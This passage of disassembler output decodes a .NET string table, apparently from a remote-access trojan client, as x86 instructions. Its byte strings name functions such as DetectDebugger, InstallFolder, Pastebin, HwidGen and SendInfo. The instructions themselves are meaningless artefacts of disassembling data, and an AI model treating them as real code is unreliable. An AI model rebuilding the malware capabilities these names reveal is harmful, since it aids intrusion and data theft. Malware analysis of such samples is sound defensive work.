  40874d:	00 75 73             	add    %dh,0x73(%ebp)
  408750:	65 72 33             	gs jb  0x408786
  408753:	32 2e                	xor    (%esi),%ch
  408755:	64 6c                	fs insb (%dx),%es:(%edi)
  408757:	6c                   	insb   (%dx),%es:(%edi)
  408758:	00 6e 74             	add    %ch,0x74(%esi)
  40875b:	64 6c                	fs insb (%dx),%es:(%edi)
  40875d:	6c                   	insb   (%dx),%es:(%edi)
  40875e:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  408761:	6c                   	insb   (%dx),%es:(%edi)
  408762:	00 4b 69             	add    %cl,0x69(%ebx)
  408765:	6c                   	insb   (%dx),%es:(%edi)
  408766:	6c                   	insb   (%dx),%es:(%edi)
  408767:	00 50 6f             	add    %dl,0x6f(%eax)
  40876a:	6c                   	insb   (%dx),%es:(%edi)
  40876b:	6c                   	insb   (%dx),%es:(%edi)
  40876c:	00 57 72             	add    %dl,0x72(%edi)
  40876f:	69 74 65 4e 75 6c 6c 	imul   $0x6c6c75,0x4e(%ebp,%eiz,2),%esi
  408776:	00 
  408777:	53                   	push   %ebx
  408778:	65 74 41             	gs je  0x4087bc
  40877b:	73 4e                	jae    0x4087cb
  40877d:	75 6c                	jne    0x4087eb
  40877f:	6c                   	insb   (%dx),%es:(%edi)
  408780:	00 4d 75             	add    %cl,0x75(%ebp)
  408783:	74 65                	je     0x4087ea
  408785:	78 43                	js     0x4087ca
  408787:	6f                   	outsl  %ds:(%esi),(%dx)
  408788:	6e                   	outsb  %ds:(%esi),(%dx)
  408789:	74 72                	je     0x4087fd
  40878b:	6f                   	outsl  %ds:(%esi),(%dx)
  40878c:	6c                   	insb   (%dx),%es:(%edi)
  40878d:	00 45 6e             	add    %al,0x6e(%ebp)
  408790:	63 6f 64             	arpl   %ebp,0x64(%edi)
  408793:	65 32 53 74          	xor    %gs:0x74(%ebx),%dl
  408797:	72 65                	jb     0x4087fe
  408799:	61                   	popa
  40879a:	6d                   	insl   (%dx),%es:(%edi)
  40879b:	00 46 69             	add    %al,0x69(%esi)
  40879e:	6c                   	insb   (%dx),%es:(%edi)
  40879f:	65 53                	gs push %ebx
  4087a1:	74 72                	je     0x408815
  4087a3:	65 61                	gs popa
  4087a5:	6d                   	insl   (%dx),%es:(%edi)
  4087a6:	00 4e 65             	add    %cl,0x65(%esi)
  4087a9:	74 77                	je     0x408822
  4087ab:	6f                   	outsl  %ds:(%esi),(%dx)
  4087ac:	72 6b                	jb     0x408819
  4087ae:	53                   	push   %ebx
  4087af:	74 72                	je     0x408823
  4087b1:	65 61                	gs popa
  4087b3:	6d                   	insl   (%dx),%es:(%edi)
  4087b4:	00 53 73             	add    %dl,0x73(%ebx)
  4087b7:	6c                   	insb   (%dx),%es:(%edi)
  4087b8:	53                   	push   %ebx
  4087b9:	74 72                	je     0x40882d
  4087bb:	65 61                	gs popa
  4087bd:	6d                   	insl   (%dx),%es:(%edi)
  4087be:	00 44 65 63          	add    %al,0x63(%ebp,%eiz,2)
  4087c2:	6f                   	outsl  %ds:(%esi),(%dx)
  4087c3:	64 65 46             	fs gs inc %esi
  4087c6:	72 6f                	jb     0x408837
  4087c8:	6d                   	insl   (%dx),%es:(%edi)
  4087c9:	53                   	push   %ebx
  4087ca:	74 72                	je     0x40883e
  4087cc:	65 61                	gs popa
  4087ce:	6d                   	insl   (%dx),%es:(%edi)
  4087cf:	00 43 72             	add    %al,0x72(%ebx)
  4087d2:	79 70                	jns    0x408844
  4087d4:	74 6f                	je     0x408845
  4087d6:	53                   	push   %ebx
  4087d7:	74 72                	je     0x40884b
  4087d9:	65 61                	gs popa
  4087db:	6d                   	insl   (%dx),%es:(%edi)
  4087dc:	00 47 5a             	add    %al,0x5a(%edi)
  4087df:	69 70 53 74 72 65 61 	imul   $0x61657274,0x53(%eax),%esi
  4087e6:	6d                   	insl   (%dx),%es:(%edi)
  4087e7:	00 4d 65             	add    %cl,0x65(%ebp)
  4087ea:	6d                   	insl   (%dx),%es:(%edi)
  4087eb:	6f                   	outsl  %ds:(%esi),(%dx)
  4087ec:	72 79                	jb     0x408867
  4087ee:	53                   	push   %ebx
  4087ef:	74 72                	je     0x408863
  4087f1:	65 61                	gs popa
  4087f3:	6d                   	insl   (%dx),%es:(%edi)
  4087f4:	00 50 72             	add    %dl,0x72(%eax)
  4087f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4087f8:	67 72 61             	addr16 jb 0x40885c
  4087fb:	6d                   	insl   (%dx),%es:(%edi)
  4087fc:	00 67 65             	add    %ah,0x65(%edi)
  4087ff:	74 5f                	je     0x408860
  408801:	49                   	dec    %ecx
  408802:	74 65                	je     0x408869
  408804:	6d                   	insl   (%dx),%es:(%edi)
  408805:	00 67 65             	add    %ah,0x65(%edi)
  408808:	74 5f                	je     0x408869
  40880a:	49                   	dec    %ecx
  40880b:	73 36                	jae    0x408843
  40880d:	34 42                	xor    $0x42,%al
  40880f:	69 74 4f 70 65 72 61 	imul   $0x74617265,0x70(%edi,%ecx,2),%esi
  408816:	74 
  408817:	69 6e 67 53 79 73 74 	imul   $0x74737953,0x67(%esi),%ebp
  40881e:	65 6d                	gs insl (%dx),%es:(%edi)
  408820:	00 43 6c             	add    %al,0x6c(%ebx)
  408823:	69 65 6e 74 2e 41 6c 	imul   $0x6c412e74,0x6e(%ebp),%esp
  40882a:	67 6f                	outsl  %ds:(%si),(%dx)
  40882c:	72 69                	jb     0x408897
  40882e:	74 68                	je     0x408898
  408830:	6d                   	insl   (%dx),%es:(%edi)
  408831:	00 53 79             	add    %dl,0x79(%ebx)
  408834:	6d                   	insl   (%dx),%es:(%edi)
  408835:	6d                   	insl   (%dx),%es:(%edi)
  408836:	65 74 72             	gs je  0x4088ab
  408839:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  408840:	69 74 68 6d 00 41 73 	imul   $0x79734100,0x6d(%eax,%ebp,2),%esi
  408847:	79 
  408848:	6d                   	insl   (%dx),%es:(%edi)
  408849:	6d                   	insl   (%dx),%es:(%edi)
  40884a:	65 74 72             	gs je  0x4088bf
  40884d:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  408854:	69 74 68 6d 00 48 61 	imul   $0x73614800,0x6d(%eax,%ebp,2),%esi
  40885b:	73 
  40885c:	68 41 6c 67 6f       	push   $0x6f676c41
  408861:	72 69                	jb     0x4088cc
  408863:	74 68                	je     0x4088cd
  408865:	6d                   	insl   (%dx),%es:(%edi)
  408866:	00 54 72 69          	add    %dl,0x69(%edx,%esi,2)
  40886a:	6d                   	insl   (%dx),%es:(%edi)
  40886b:	00 52 61             	add    %dl,0x61(%edx)
  40886e:	6e                   	outsb  %ds:(%esi),(%dx)
  40886f:	64 6f                	outsl  %fs:(%esi),(%dx)
  408871:	6d                   	insl   (%dx),%es:(%edi)
  408872:	00 49 43             	add    %cl,0x43(%ecx)
  408875:	72 79                	jb     0x4088f0
  408877:	70 74                	jo     0x4088ed
  408879:	6f                   	outsl  %ds:(%esi),(%dx)
  40887a:	54                   	push   %esp
  40887b:	72 61                	jb     0x4088de
  40887d:	6e                   	outsb  %ds:(%esi),(%dx)
  40887e:	73 66                	jae    0x4088e6
  408880:	6f                   	outsl  %ds:(%esi),(%dx)
  408881:	72 6d                	jb     0x4088f0
  408883:	00 4d 73             	add    %cl,0x73(%ebp)
  408886:	67 50                	addr16 push %eax
  408888:	61                   	popa
  408889:	63 6b 45             	arpl   %ebp,0x45(%ebx)
  40888c:	6e                   	outsb  %ds:(%esi),(%dx)
  40888d:	75 6d                	jne    0x4088fc
  40888f:	00 57 72             	add    %dl,0x72(%edi)
  408892:	69 74 65 42 6f 6f 6c 	imul   $0x656c6f6f,0x42(%ebp,%eiz,2),%esi
  408899:	65 
  40889a:	61                   	popa
  40889b:	6e                   	outsb  %ds:(%esi),(%dx)
  40889c:	00 54 6f 42          	add    %dl,0x42(%edi,%ebp,2)
  4088a0:	6f                   	outsl  %ds:(%esi),(%dx)
  4088a1:	6f                   	outsl  %ds:(%esi),(%dx)
  4088a2:	6c                   	insb   (%dx),%es:(%edi)
  4088a3:	65 61                	gs popa
  4088a5:	6e                   	outsb  %ds:(%esi),(%dx)
  4088a6:	00 53 65             	add    %dl,0x65(%ebx)
  4088a9:	74 41                	je     0x4088ec
  4088ab:	73 42                	jae    0x4088ef
  4088ad:	6f                   	outsl  %ds:(%esi),(%dx)
  4088ae:	6f                   	outsl  %ds:(%esi),(%dx)
  4088af:	6c                   	insb   (%dx),%es:(%edi)
  4088b0:	65 61                	gs popa
  4088b2:	6e                   	outsb  %ds:(%esi),(%dx)
  4088b3:	00 48 77             	add    %cl,0x77(%eax)
  4088b6:	69 64 47 65 6e 00 6c 	imul   $0x656c006e,0x65(%edi,%eax,2),%esp
  4088bd:	65 
  4088be:	6e                   	outsb  %ds:(%esi),(%dx)
  4088bf:	00 63 68             	add    %ah,0x68(%ebx)
  4088c2:	69 6c 64 72 65 6e 00 	imul   $0x4d006e65,0x72(%esp,%eiz,2),%ebp
  4088c9:	4d 
  4088ca:	61                   	popa
  4088cb:	69 6e 00 58 35 30 39 	imul   $0x39303558,0x0(%esi),%ebp
  4088d2:	43                   	inc    %ebx
  4088d3:	68 61 69 6e 00       	push   $0x6e6961
  4088d8:	63 68 61             	arpl   %ebp,0x61(%eax)
  4088db:	69 6e 00 41 70 70 44 	imul   $0x44707041,0x0(%esi),%ebp
  4088e2:	6f                   	outsl  %ds:(%esi),(%dx)
  4088e3:	6d                   	insl   (%dx),%es:(%edi)
  4088e4:	61                   	popa
  4088e5:	69 6e 00 67 65 74 5f 	imul   $0x5f746567,0x0(%esi),%ebp
  4088ec:	43                   	inc    %ebx
  4088ed:	75 72                	jne    0x408961
  4088ef:	72 65                	jb     0x408956
  4088f1:	6e                   	outsb  %ds:(%esi),(%dx)
  4088f2:	74 44                	je     0x408938
  4088f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4088f5:	6d                   	insl   (%dx),%es:(%edi)
  4088f6:	61                   	popa
  4088f7:	69 6e 00 50 61 73 74 	imul   $0x74736150,0x0(%esi),%ebp
  4088fe:	65 62 69 6e          	bound  %ebp,%gs:0x6e(%ecx)
  408902:	00 49 73             	add    %cl,0x73(%ecx)
  408905:	41                   	inc    %ecx
  408906:	64 6d                	fs insl (%dx),%es:(%edi)
  408908:	69 6e 00 4a 6f 69 6e 	imul   $0x6e696f4a,0x0(%esi),%ebp
  40890f:	00 47 65             	add    %al,0x65(%edi)
  408912:	74 46                	je     0x40895a
  408914:	69 6c 65 4e 61 6d 65 	imul   $0x57656d61,0x4e(%ebp,%eiz,2),%ebp
  40891b:	57 
  40891c:	69 74 68 6f 75 74 45 	imul   $0x78457475,0x6f(%eax,%ebp,2),%esi
  408923:	78 
  408924:	74 65                	je     0x40898b
  408926:	6e                   	outsb  %ds:(%esi),(%dx)
  408927:	73 69                	jae    0x408992
  408929:	6f                   	outsl  %ds:(%esi),(%dx)
  40892a:	6e                   	outsb  %ds:(%esi),(%dx)
  40892b:	00 67 65             	add    %ah,0x65(%edi)
  40892e:	74 5f                	je     0x40898f
  408930:	4f                   	dec    %edi
  408931:	53                   	push   %ebx
  408932:	56                   	push   %esi
  408933:	65 72 73             	gs jb  0x4089a9
  408936:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  40893d:	74 65                	je     0x4089a4
  40893f:	6d                   	insl   (%dx),%es:(%edi)
  408940:	2e 49                	cs dec %ecx
  408942:	4f                   	dec    %edi
  408943:	2e 43                	cs inc %ebx
  408945:	6f                   	outsl  %ds:(%esi),(%dx)
  408946:	6d                   	insl   (%dx),%es:(%edi)
  408947:	70 72                	jo     0x4089bb
  408949:	65 73 73             	gs jae 0x4089bf
  40894c:	69 6f 6e 00 41 70 70 	imul   $0x70704100,0x6e(%edi),%ebp
  408953:	6c                   	insb   (%dx),%es:(%edi)
  408954:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  40895b:	00 53 79             	add    %dl,0x79(%ebx)
  40895e:	73 74                	jae    0x4089d4
  408960:	65 6d                	gs insl (%dx),%es:(%edi)
  408962:	2e 53                	cs push %ebx
  408964:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  408968:	69 74 79 2e 41 75 74 	imul   $0x68747541,0x2e(%ecx,%edi,2),%esi
  40896f:	68 
  408970:	65 6e                	outsb  %gs:(%esi),(%dx)
  408972:	74 69                	je     0x4089dd
  408974:	63 61 74             	arpl   %esp,0x74(%ecx)
  408977:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  40897e:	74 65                	je     0x4089e5
  408980:	6d                   	insl   (%dx),%es:(%edi)
  408981:	2e 52                	cs push %edx
  408983:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  408986:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40898b:	6e                   	outsb  %ds:(%esi),(%dx)
  40898c:	00 58 35             	add    %bl,0x35(%eax)
  40898f:	30 39                	xor    %bh,(%ecx)
  408991:	43                   	inc    %ebx
  408992:	65 72 74             	gs jb  0x408a09
  408995:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  40899c:	43                   	inc    %ebx
  40899d:	6f                   	outsl  %ds:(%esi),(%dx)
  40899e:	6c                   	insb   (%dx),%es:(%edi)
  40899f:	6c                   	insb   (%dx),%es:(%edi)
  4089a0:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4089a5:	6e                   	outsb  %ds:(%esi),(%dx)
  4089a6:	00 4d 61             	add    %cl,0x61(%ebp)
  4089a9:	6e                   	outsb  %ds:(%esi),(%dx)
  4089aa:	61                   	popa
  4089ab:	67 65 6d             	gs insl (%dx),%es:(%di)
  4089ae:	65 6e                	outsb  %gs:(%esi),(%dx)
  4089b0:	74 4f                	je     0x408a01
  4089b2:	62 6a 65             	bound  %ebp,0x65(%edx)
  4089b5:	63 74 43 6f          	arpl   %esi,0x6f(%ebx,%eax,2)
  4089b9:	6c                   	insb   (%dx),%es:(%edi)
  4089ba:	6c                   	insb   (%dx),%es:(%edi)
  4089bb:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4089c0:	6e                   	outsb  %ds:(%esi),(%dx)
  4089c1:	00 43 6c             	add    %al,0x6c(%ebx)
  4089c4:	69 65 6e 74 2e 43 6f 	imul   $0x6f432e74,0x6e(%ebp),%esp
  4089cb:	6e                   	outsb  %ds:(%esi),(%dx)
  4089cc:	6e                   	outsb  %ds:(%esi),(%dx)
  4089cd:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4089d2:	6e                   	outsb  %ds:(%esi),(%dx)
  4089d3:	00 73 65             	add    %dh,0x65(%ebx)
  4089d6:	74 5f                	je     0x408a37
  4089d8:	50                   	push   %eax
  4089d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4089da:	73 69                	jae    0x408a45
  4089dc:	74 69                	je     0x408a47
  4089de:	6f                   	outsl  %ds:(%esi),(%dx)
  4089df:	6e                   	outsb  %ds:(%esi),(%dx)
  4089e0:	00 70 6f             	add    %dh,0x6f(%eax)
  4089e3:	73 69                	jae    0x408a4e
  4089e5:	74 69                	je     0x408a50
  4089e7:	6f                   	outsl  %ds:(%esi),(%dx)
  4089e8:	6e                   	outsb  %ds:(%esi),(%dx)
  4089e9:	00 43 72             	add    %al,0x72(%ebx)
  4089ec:	79 70                	jns    0x408a5e
  4089ee:	74 6f                	je     0x408a5f
  4089f0:	67 72 61             	addr16 jb 0x408a54
  4089f3:	70 68                	jo     0x408a5d
  4089f5:	69 63 45 78 63 65 70 	imul   $0x70656378,0x45(%ebx),%esp
  4089fc:	74 69                	je     0x408a67
  4089fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4089ff:	6e                   	outsb  %ds:(%esi),(%dx)
  408a00:	00 41 72             	add    %al,0x72(%ecx)
  408a03:	67 75 6d             	addr16 jne 0x408a73
  408a06:	65 6e                	outsb  %gs:(%esi),(%dx)
  408a08:	74 4e                	je     0x408a58
  408a0a:	75 6c                	jne    0x408a78
  408a0c:	6c                   	insb   (%dx),%es:(%edi)
  408a0d:	45                   	inc    %ebp
  408a0e:	78 63                	js     0x408a73
  408a10:	65 70 74             	gs jo  0x408a87
  408a13:	69 6f 6e 00 41 72 67 	imul   $0x67724100,0x6e(%edi),%ebp
  408a1a:	75 6d                	jne    0x408a89
  408a1c:	65 6e                	outsb  %gs:(%esi),(%dx)
  408a1e:	74 45                	je     0x408a65
  408a20:	78 63                	js     0x408a85
  408a22:	65 70 74             	gs jo  0x408a99
  408a25:	69 6f 6e 00 55 6e 6b 	imul   $0x6b6e5500,0x6e(%edi),%ebp
  408a2c:	6e                   	outsb  %ds:(%esi),(%dx)
  408a2d:	6f                   	outsl  %ds:(%esi),(%dx)
  408a2e:	77 6e                	ja     0x408a9e
  408a30:	00 49 6d             	add    %cl,0x6d(%ecx)
  408a33:	61                   	popa
  408a34:	67 65 43             	addr16 gs inc %ebx
  408a37:	6f                   	outsl  %ds:(%esi),(%dx)
  408a38:	64 65 63 49 6e       	fs arpl %ecx,%gs:0x6e(%ecx)
  408a3d:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a3f:	00 53 65             	add    %dl,0x65(%ebx)
  408a42:	6e                   	outsb  %ds:(%esi),(%dx)
  408a43:	64 49                	fs dec %ecx
  408a45:	6e                   	outsb  %ds:(%esi),(%dx)
  408a46:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a48:	00 46 69             	add    %al,0x69(%esi)
  408a4b:	6c                   	insb   (%dx),%es:(%edi)
  408a4c:	65 49                	gs dec %ecx
  408a4e:	6e                   	outsb  %ds:(%esi),(%dx)
  408a4f:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a51:	00 44 72 69          	add    %al,0x69(%edx,%esi,2)
  408a55:	76 65                	jbe    0x408abc
  408a57:	49                   	dec    %ecx
  408a58:	6e                   	outsb  %ds:(%esi),(%dx)
  408a59:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a5b:	00 46 69             	add    %al,0x69(%esi)
  408a5e:	6c                   	insb   (%dx),%es:(%edi)
  408a5f:	65 53                	gs push %ebx
  408a61:	79 73                	jns    0x408ad6
  408a63:	74 65                	je     0x408aca
  408a65:	6d                   	insl   (%dx),%es:(%edi)
  408a66:	49                   	dec    %ecx
  408a67:	6e                   	outsb  %ds:(%esi),(%dx)
  408a68:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a6a:	00 43 6f             	add    %al,0x6f(%ebx)
  408a6d:	6d                   	insl   (%dx),%es:(%edi)
  408a6e:	70 75                	jo     0x408ae5
  408a70:	74 65                	je     0x408ad7
  408a72:	72 49                	jb     0x408abd
  408a74:	6e                   	outsb  %ds:(%esi),(%dx)
  408a75:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a77:	00 43 53             	add    %al,0x53(%ebx)
  408a7a:	68 61 72 70 41       	push   $0x41707261
  408a7f:	72 67                	jb     0x408ae8
  408a81:	75 6d                	jne    0x408af0
  408a83:	65 6e                	outsb  %gs:(%esi),(%dx)
  408a85:	74 49                	je     0x408ad0
  408a87:	6e                   	outsb  %ds:(%esi),(%dx)
  408a88:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a8a:	00 50 72             	add    %dl,0x72(%eax)
  408a8d:	6f                   	outsl  %ds:(%esi),(%dx)
  408a8e:	63 65 73             	arpl   %esp,0x73(%ebp)
  408a91:	73 53                	jae    0x408ae6
  408a93:	74 61                	je     0x408af6
  408a95:	72 74                	jb     0x408b0b
  408a97:	49                   	dec    %ecx
  408a98:	6e                   	outsb  %ds:(%esi),(%dx)
  408a99:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a9b:	00 57 72             	add    %dl,0x72(%edi)
  408a9e:	69 74 65 4d 61 70 00 	imul   $0x50007061,0x4d(%ebp,%eiz,2),%esi
  408aa5:	50 
  408aa6:	72 65                	jb     0x408b0d
  408aa8:	76 65                	jbe    0x408b0f
  408aaa:	6e                   	outsb  %ds:(%esi),(%dx)
  408aab:	74 53                	je     0x408b00
  408aad:	6c                   	insb   (%dx),%es:(%edi)
  408aae:	65 65 70 00          	gs gs jo 0x408ab2
  408ab2:	5a                   	pop    %edx
  408ab3:	69 70 00 63 75 72 72 	imul   $0x72727563,0x0(%eax),%esi
  408aba:	65 6e                	outsb  %gs:(%esi),(%dx)
  408abc:	74 41                	je     0x408aff
  408abe:	70 70                	jo     0x408b30
  408ac0:	00 4d 69             	add    %cl,0x69(%ebp)
  408ac3:	63 72 6f             	arpl   %esi,0x6f(%edx)
  408ac6:	73 6f                	jae    0x408b37
  408ac8:	66 74 2e             	data16 je 0x408af9
  408acb:	43                   	inc    %ebx
  408acc:	53                   	push   %ebx
  408acd:	68 61 72 70 00       	push   $0x707261
  408ad2:	47                   	inc    %edi
  408ad3:	72 6f                	jb     0x408b44
  408ad5:	75 70                	jne    0x408b47
  408ad7:	00 4e 6f             	add    %cl,0x6f(%esi)
  408ada:	72 6d                	jb     0x408b49
  408adc:	61                   	popa
  408add:	6c                   	insb   (%dx),%es:(%edi)
  408ade:	53                   	push   %ebx
  408adf:	74 61                	je     0x408b42
  408ae1:	72 74                	jb     0x408b57
  408ae3:	75 70                	jne    0x408b55
  408ae5:	00 53 79             	add    %dl,0x79(%ebx)
  408ae8:	73 74                	jae    0x408b5e
  408aea:	65 6d                	gs insl (%dx),%es:(%edi)
  408aec:	2e 4c                	cs dec %esp
  408aee:	69 6e 71 00 43 6c 65 	imul   $0x656c4300,0x71(%esi),%ebp
  408af5:	61                   	popa
  408af6:	72 00                	jb     0x408af8
  408af8:	43                   	inc    %ebx
  408af9:	68 61 72 00 49       	push   $0x49007261
  408afe:	6e                   	outsb  %ds:(%esi),(%dx)
  408aff:	76 6f                	jbe    0x408b70
  408b01:	6b 65 4d 65          	imul   $0x65,0x4d(%ebp),%esp
  408b05:	6d                   	insl   (%dx),%es:(%edi)
  408b06:	62 65 72             	bound  %esp,0x72(%ebp)
  408b09:	00 4d 44             	add    %cl,0x44(%ebp)
  408b0c:	35 43 72 79 70       	xor    $0x70797243,%eax
  408b11:	74 6f                	je     0x408b82
  408b13:	53                   	push   %ebx
  408b14:	65 72 76             	gs jb  0x408b8d
  408b17:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  408b1e:	69 64 65 72 00 52 53 	imul   $0x41535200,0x72(%ebp,%eiz,2),%esp
  408b25:	41 
  408b26:	43                   	inc    %ebx
  408b27:	72 79                	jb     0x408ba2
  408b29:	70 74                	jo     0x408b9f
  408b2b:	6f                   	outsl  %ds:(%esi),(%dx)
  408b2c:	53                   	push   %ebx
  408b2d:	65 72 76             	gs jb  0x408ba6
  408b30:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  408b37:	69 64 65 72 00 41 65 	imul   $0x73654100,0x72(%ebp,%eiz,2),%esp
  408b3e:	73 
  408b3f:	43                   	inc    %ebx
  408b40:	72 79                	jb     0x408bbb
  408b42:	70 74                	jo     0x408bb8
  408b44:	6f                   	outsl  %ds:(%esi),(%dx)
  408b45:	53                   	push   %ebx
  408b46:	65 72 76             	gs jb  0x408bbf
  408b49:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  408b50:	69 64 65 72 00 53 74 	imul   $0x72745300,0x72(%ebp,%eiz,2),%esp
  408b57:	72 
  408b58:	69 6e 67 42 75 69 6c 	imul   $0x6c697542,0x67(%esi),%ebp
  408b5f:	64 65 72 00          	fs gs jb 0x408b63
  408b63:	49                   	dec    %ecx
  408b64:	6e                   	outsb  %ds:(%esi),(%dx)
  408b65:	73 74                	jae    0x408bdb
  408b67:	61                   	popa
  408b68:	6c                   	insb   (%dx),%es:(%edi)
  408b69:	6c                   	insb   (%dx),%es:(%edi)
  408b6a:	46                   	inc    %esi
  408b6b:	6f                   	outsl  %ds:(%esi),(%dx)
  408b6c:	6c                   	insb   (%dx),%es:(%edi)
  408b6d:	64 65 72 00          	fs gs jb 0x408b71
  408b71:	49                   	dec    %ecx
  408b72:	64 53                	fs push %ebx
  408b74:	65 6e                	outsb  %gs:(%esi),(%dx)
  408b76:	64 65 72 00          	fs gs jb 0x408b7a
  408b7a:	73 65                	jae    0x408be1
  408b7c:	6e                   	outsb  %ds:(%esi),(%dx)
  408b7d:	64 65 72 00          	fs gs jb 0x408b81
  408b81:	4d                   	dec    %ebp
  408b82:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  408b89:	74 2e                	je     0x408bb9
  408b8b:	43                   	inc    %ebx
  408b8c:	53                   	push   %ebx
  408b8d:	68 61 72 70 2e       	push   $0x2e707261
  408b92:	52                   	push   %edx
  408b93:	75 6e                	jne    0x408c03
  408b95:	74 69                	je     0x408c00
  408b97:	6d                   	insl   (%dx),%es:(%edi)
  408b98:	65 42                	gs inc %edx
  408b9a:	69 6e 64 65 72 00 43 	imul   $0x43007265,0x64(%esi),%ebp
  408ba1:	61                   	popa
  408ba2:	6c                   	insb   (%dx),%es:(%edi)
  408ba3:	6c                   	insb   (%dx),%es:(%edi)
  408ba4:	53                   	push   %ebx
  408ba5:	69 74 65 42 69 6e 64 	imul   $0x65646e69,0x42(%ebp,%eiz,2),%esi
  408bac:	65 
  408bad:	72 00                	jb     0x408baf
  408baf:	47                   	inc    %edi
  408bb0:	65 74 45             	gs je  0x408bf8
  408bb3:	6e                   	outsb  %ds:(%esi),(%dx)
  408bb4:	63 6f 64             	arpl   %ebp,0x64(%edi)
  408bb7:	65 72 00             	gs jb  0x408bba
  408bba:	67 65 74 5f          	addr16 gs je 0x408c1d
  408bbe:	42                   	inc    %edx
  408bbf:	75 66                	jne    0x408c27
  408bc1:	66 65 72 00          	data16 gs jb 0x408bc5
  408bc5:	73 65                	jae    0x408c2c
  408bc7:	74 5f                	je     0x408c28
  408bc9:	42                   	inc    %edx
  408bca:	75 66                	jne    0x408c32
  408bcc:	66 65 72 00          	data16 gs jb 0x408bd0
  408bd0:	57                   	push   %edi
  408bd1:	72 69                	jb     0x408c3c
  408bd3:	74 65                	je     0x408c3a
  408bd5:	49                   	dec    %ecx
  408bd6:	6e                   	outsb  %ds:(%esi),(%dx)
  408bd7:	74 65                	je     0x408c3e
  408bd9:	67 65 72 00          	addr16 gs jb 0x408bdd
  408bdd:	67 65 74 5f          	addr16 gs je 0x408c40
  408be1:	41                   	inc    %ecx
  408be2:	73 49                	jae    0x408c2d
  408be4:	6e                   	outsb  %ds:(%esi),(%dx)
  408be5:	74 65                	je     0x408c4c
  408be7:	67 65 72 00          	addr16 gs jb 0x408beb
  408beb:	73 65                	jae    0x408c52
  408bed:	74 5f                	je     0x408c4e
  408bef:	41                   	inc    %ecx
  408bf0:	73 49                	jae    0x408c3b
  408bf2:	6e                   	outsb  %ds:(%esi),(%dx)
  408bf3:	74 65                	je     0x408c5a
  408bf5:	67 65 72 00          	addr16 gs jb 0x408bf9
  408bf9:	47                   	inc    %edi
  408bfa:	65 74 41             	gs je  0x408c3e
  408bfd:	73 49                	jae    0x408c48
  408bff:	6e                   	outsb  %ds:(%esi),(%dx)
  408c00:	74 65                	je     0x408c67
  408c02:	67 65 72 00          	addr16 gs jb 0x408c06
  408c06:	53                   	push   %ebx
  408c07:	65 74 41             	gs je  0x408c4b
  408c0a:	73 49                	jae    0x408c55
  408c0c:	6e                   	outsb  %ds:(%esi),(%dx)
  408c0d:	74 65                	je     0x408c74
  408c0f:	67 65 72 00          	addr16 gs jb 0x408c13
  408c13:	44                   	inc    %esp
  408c14:	65 74 65             	gs je  0x408c7c
  408c17:	63 74 44 65          	arpl   %esi,0x65(%esp,%eax,2)
  408c1b:	62 75 67             	bound  %esi,0x67(%ebp)
  408c1e:	67 65 72 00          	addr16 gs jb 0x408c22
  408c22:	4d                   	dec    %ebp
  408c23:	61                   	popa
  408c24:	6e                   	outsb  %ds:(%esi),(%dx)
  408c25:	61                   	popa
  408c26:	67 65 6d             	gs insl (%dx),%es:(%di)
  408c29:	65 6e                	outsb  %gs:(%esi),(%dx)
  408c2b:	74 4f                	je     0x408c7c
  408c2d:	62 6a 65             	bound  %ebp,0x65(%edx)
  408c30:	63 74 53 65          	arpl   %esi,0x65(%ebx,%edx,2)
  408c34:	61                   	popa
  408c35:	72 63                	jb     0x408c9a
  408c37:	68 65 72 00 53       	push   $0x53007265
  408c3c:	65 73 73             	gs jae 0x408cb2
  408c3f:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  408c46:	6e                   	outsb  %ds:(%esi),(%dx)
  408c47:	67 45                	addr16 inc %ebp
  408c49:	76 65                	jbe    0x408cb0
  408c4b:	6e                   	outsb  %ds:(%esi),(%dx)
  408c4c:	74 48                	je     0x408c96
  408c4e:	61                   	popa
  408c4f:	6e                   	outsb  %ds:(%esi),(%dx)
  408c50:	64 6c                	fs insb (%dx),%es:(%edi)
  408c52:	65 72 00             	gs jb  0x408c55
  408c55:	54                   	push   %esp
  408c56:	69 6d 65 72 00 6f 77 	imul   $0x776f0072,0x65(%ebp),%ebp
  408c5d:	6e                   	outsb  %ds:(%esi),(%dx)
  408c5e:	65 72 00             	gs jb  0x408c61
  408c61:	43                   	inc    %ebx
  408c62:	6c                   	insb   (%dx),%es:(%edi)
  408c63:	69 65 6e 74 2e 48 65 	imul   $0x65482e74,0x6e(%ebp),%esp
  408c6a:	6c                   	insb   (%dx),%es:(%edi)
  408c6b:	70 65                	jo     0x408cd2
  408c6d:	72 00                	jb     0x408c6f
